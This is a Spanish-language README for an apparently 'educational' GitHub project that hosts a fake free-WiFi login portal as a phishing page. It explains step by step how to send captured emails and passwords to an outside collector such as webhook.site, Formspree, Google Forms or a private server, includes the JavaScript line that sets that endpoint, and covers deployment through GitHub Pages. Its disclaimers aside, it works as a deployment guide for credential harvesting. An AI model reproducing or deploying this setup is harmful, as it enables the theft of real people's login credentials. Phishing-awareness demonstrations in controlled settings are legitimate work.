# WiFi Phishing Attack - Proyecto Educativo

⚠️ **ADVERTENCIA**: Este proyecto es únicamente con fines educativos para demostrar técnicas de phishing. No usar con intenciones maliciosas.

## 📋 Descripción

Página web de demostración que simula un portal de WiFi gratuito para educar sobre ataques de phishing.

## 🔧 Configuración para Guardar Credenciales

Dado que GitHub Pages solo sirve archivos estáticos, necesitas un backend para guardar las credenciales. Aquí tienes varias opciones:

### Opción 1: Webhook.site (Más Rápido - Para Pruebas)

1. Ve a https://webhook.site
2. Copia la URL única que te dan
3. En [index.html](index.html), reemplaza `TU_WEBHOOK_URL_AQUI` con esa URL
4. Todas las credenciales aparecerán en tiempo real en webhook.site

**Ejemplo:**
```javascript
const webhookURL = 'https://webhook.site/tu-id-unico-aqui';
```

### Opción 2: Google Forms (Permanente y Gratis)

1. Crea un nuevo Google Form en https://forms.google.com
2. Añade dos preguntas: "Email" y "Password"
3. Obtén el enlace de envío del formulario
4. Modifica el código para usar la API de Google Forms

### Opción 3: Formspree (Recomendado)

1. Regístrate en https://formspree.io (gratis hasta 50 envíos/mes)
2. Crea un nuevo formulario
3. Copia la URL del endpoint
4. Reemplaza en [index.html](index.html):
```javascript
const webhookURL = 'https://formspree.io/f/tu-id-aqui';
```

### Opción 4: Servidor propio con Node.js

Si quieres alojar tu propio servidor:

1. Despliega en servicios como Render, Railway o Vercel
2. Crea un endpoint POST que guarde en un archivo o base de datos
3. Actualiza la URL en [index.html](index.html)

## 📊 Ver las Credenciales Capturadas

- **Webhook.site**: Ve directamente a tu URL única
- **Formspree**: Revisa tu panel de control
- **Google Forms**: Ve las respuestas en Google Sheets
- **Servidor propio**: Accede a tu base de datos o archivo de logs

## 🚀 Despliegue

1. Haz commit de los cambios:
```bash
git add .
git commit -m "Configurar captura de credenciales"
git push origin main
```

2. Ve a Settings > Pages en tu repositorio de GitHub
3. Asegúrate de que GitHub Pages esté habilitado desde la rama `main`

## 📝 Uso en Presentación

Durante tu presentación, puedes:
1. Mostrar la página de phishing
2. Ingresar credenciales de prueba
3. Mostrar en tiempo real cómo se capturan en tu webhook/servicio
4. Explicar las señales de advertencia del phishing

## ⚖️ Aviso Legal

Este proyecto es solo para fines educativos. El uso malicioso de técnicas de phishing es ilegal. Úsalo solo en entornos controlados con permiso explícito.
